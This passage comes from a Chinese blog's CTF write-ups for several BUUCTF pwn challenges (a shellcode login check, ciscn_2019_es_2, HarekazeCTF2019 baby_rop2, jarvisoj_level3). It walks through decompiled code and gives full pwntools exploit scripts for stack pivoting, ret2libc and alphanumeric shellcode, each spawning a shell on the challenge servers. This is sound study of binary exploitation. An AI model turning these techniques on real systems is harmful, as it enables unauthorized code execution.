class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// 无符号整数</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// 用于保存数据大小的类型</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// 整数，用于循环计数</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// 指向内存块的指针</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// 无符号64位整数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保存当前线程的堆栈基址</span></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 循环检查字符串a1中的每个字符是否可打印（isprint）或是换行符（&#x27;\n&#x27;）</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 如果字符不可打印且不是换行符，输出错误信息并退出程序</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查全局变量unk_202028是否等于1，如果不等于1，输出错误信息并退出程序</span></span><br><span class="line">  <span class="keyword">if</span> (unk_202028 != <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unk_202024)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取系统页面大小</span></span><br><span class="line">    v1 = getpagesize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用mmap分配一块内存，并将其设置为可执行、可读、可写，然后将a1的内容复制到该内存块</span></span><br><span class="line">    dest = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">char</span> *)&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将该内存块当作函数调用</span></span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果unk_202024为0，直接输出a1的内容</span></span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回函数结束前的堆栈基址与v6的异或结果</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此要将两个变量修改到符合条件，当v7&#x3D;1时的函数sub_CBD可以将两个变量都改成1，使其符合条件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// 整数，用于循环计数</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// 无符号64位整数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保存当前线程的堆栈基址</span></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 循环检查字符串a1中的每个字符是否可打印（isprint）或是换行符（&#x27;\n&#x27;）</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 如果字符不可打印且不是换行符，输出错误信息并退出程序</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查字符串a1是否等于 &quot;ro0t&quot;，如果是，将全局变量unk_202028和unk_202024都设置为1</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果不等于 &quot;ro0t&quot;，将全局变量unk_202028设置为1</span></span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回函数结束前的堆栈基址与v3的异或结果</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;182.92.176.248&#x27;</span>,<span class="number">1111</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./login&#x27;)</span></span><br><span class="line">shellcode=<span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">payload1=<span class="string">b&#x27;opt:1\n&#x27;</span>+<span class="string">b&#x27;msg:ro0ta\n&#x27;</span></span><br><span class="line">payload2=<span class="string">b&#x27;opt:2\n&#x27;</span>+<span class="string">b&#x27;msg:&#x27;</span>+shellcode+<span class="string">b&#x27;a\n&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="buuctf-ciscn-2019-es-2"><a href="#buuctf-ciscn-2019-es-2" class="headerlink" title="buuctf_ciscn_2019_es_2"></a>buuctf_ciscn_2019_es_2</h1><h2 id="查看保护和反汇编"><a href="#查看保护和反汇编" class="headerlink" title="查看保护和反汇编"></a>查看保护和反汇编</h2><p>checksec</p>
<img src="/yw/259342972/ciscn_2019_es_2_1.png" class>
<p>32位堆栈不可执行<br>ida<br>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vul函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次read可以输入<br>虽然有溢出但是余出的长度只有八字节。<br>在hack中有system函数，但是只是简单的输出flag字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果能将&#x2F;bin&#x2F;sh作为参数调用system函数就能getshell了<br>这道题用栈迁移来解，<a href="https://yw-by.github.io/yw/4180228739/">栈迁移原理</a><br>寻找gadget（leave_ret）</p>
<img src="/yw/259342972/ciscn_2019_es_2_2.png" class>
<p>leave_ret_addr&#x3D;0x080484b8<br>第一次read(我的意思是输入)用来泄露ebp的地址<br>printf当遇到\x00时才会停止输出，将下一处的终止符覆盖就可以打印出ebp的地址，就像覆盖泄露canary一样来泄露ebp的地址<br>还要说的是，栈也是有地址的，后面用gdb的时候会说哪里是栈的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paylaod1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(paylaod1)<span class="comment">#不能用senldine，会多输入一个&#x27;\n&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>现在我们要确定s在栈上的位置，好在第二次read时对栈进行布局。<br>选择的是用ebp+偏移量的方法来表示s的地址<br>gdb调试<br>从其他师傅处得来的经验，选择在nop处下断点</p>
<img src="/yw/259342972/ciscn_2019_es_2_3.png" class>
<p>上面的是ida的，当然也没有忘记gdb怎么用，也挺好用的</p>
<img src="/yw/259342972/ciscn_2019_es_2_4.png" class>

<p>总之断点地址：0x080485fc<br>下断点后运行（r），第一次read时输入aaaa，终止（ctrl+c），查看栈（stack）</p>
<img src="/yw/259342972/ciscn_2019_es_2_5.png" class>

<p>所说数据存储在栈上，栈也是有地址的，这个地址指向的才是数据，也有栈指向一个地址，这个地址指向数据的。<br>上图左侧黄颜色的就是栈的地址<br>计算s到ebp的偏移量</p>
<img src="/yw/259342972/ciscn_2019_es_2_6.png" class>
<p>0x38字节，所以s地址：ebp-0x38<br>第二次paylaod的布局图（0x10&#x3D;16）</p>
<img src="/yw/259342972/ciscn_2019_es_2_7.png" class>
<p>payload2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">leave_ret_addr=<span class="number">0x080484b8</span></span><br><span class="line">system_addr=<span class="number">0x08048400</span></span><br><span class="line">bin_sh_addr=ebp-<span class="number">0x38</span>+<span class="number">0x10</span></span><br><span class="line">payload2=(<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(leave_ret_addr)</span><br><span class="line"><span class="comment">#对于上面system后的aaaa，注意32位程序调用函数的顺序（参数、返回地址、函数）</span></span><br></pre></td></tr></table></figure>

<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29270</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">leave_ret_addr=<span class="number">0x080484b8</span></span><br><span class="line">system_addr=<span class="number">0x08048400</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"><span class="comment">#s=ebp_addr-0x38</span></span><br><span class="line">bin_sh_addr=ebp_addr-<span class="number">0x38</span>+<span class="number">0x10</span></span><br><span class="line">payload2=(<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(ebp_addr-<span class="number">0x38</span>)+p32(leave_ret_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第六周"><a href="#第六周" class="headerlink" title="第六周"></a>第六周</h1><h1 id="buuctf-HarekazeCTF2019-baby-rop2"><a href="#buuctf-HarekazeCTF2019-baby-rop2" class="headerlink" title="buuctf_[HarekazeCTF2019]baby_rop2"></a>buuctf_[HarekazeCTF2019]baby_rop2</h1><h2 id="查看保护和反汇编-1"><a href="#查看保护和反汇编-1" class="headerlink" title="查看保护和反汇编"></a>查看保护和反汇编</h2><p>checksec</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_1.png" class>
<p>64位，堆栈不可执行<br>ida<br>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看字符串窗口，没有有用的<br>通过printf打印read的地址，从而泄露libc版本<br>关于printf函数，要两个参数，一个是’%s‘，一个是read的got表地址<br>%s有必要说，我们没办法自己写入，只能用题目中给的</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_2.png" class>
<p>地址</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_3.png" class>

<p>所以这次的gadget要找俩</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_4.png" class>
<p>第一个参数用rdi传，第二个用rsi，没找到只有rsi的，所以第二个用带r15的，传参的时候多随意写一个就行。</p>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28669</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x0400733</span></span><br><span class="line">ret_addr=<span class="number">0x04004d1</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400731</span></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">s_addr=<span class="number">0x400770</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_addr)+p64(s_addr)+p64(pop_rsi_r15_addr)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name? &#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"><span class="comment">#printf_addr=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">read_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libcbase=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_addr)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name? &#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>接收read地址那里，不是很明白，不明白在为什么是’\x7f’而不是换行符，<br>‘\x7f’是不可见字符，对应的ASCII是删除字符<br>后面的[:-6]是因为有效地址是6位（puts是这样的，所以认为read也是这样），在将其补全至8位解包</p>
<h1 id="buuctf-jarvisoj-level3"><a href="#buuctf-jarvisoj-level3" class="headerlink" title="buuctf_jarvisoj_level3"></a>buuctf_jarvisoj_level3</h1><h2 id="保护-ida"><a href="#保护-ida" class="headerlink" title="保护+ida"></a>保护+ida</h2><p>checksec</p>
<img src="/yw/259342972/jarvisoj_level3_1.png" class>
<p>32位，堆栈不可执行<br>ida<br>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vulnerable_function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>字符串窗口没有后门<br>ret2ibc，没有弯弯绕</p>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27993</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libcbase=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(str_bin_sh)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>yw-by
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://yw-by.github.io/yw/259342972/" title="暑期刷题">http://yw-by.github.io/yw/259342972/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/yw/2556573078/" rel="prev" title="docker+ctf_xinetd出pwn题教程">
                  <i class="fa fa-chevron-left"></i> docker+ctf_xinetd出pwn题教程
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/yw/4180228739/" rel="next" title="栈迁移原理与应用">
                  栈迁移原理与应用 <i class="fa fa-chevron-right"></i>
                </a>
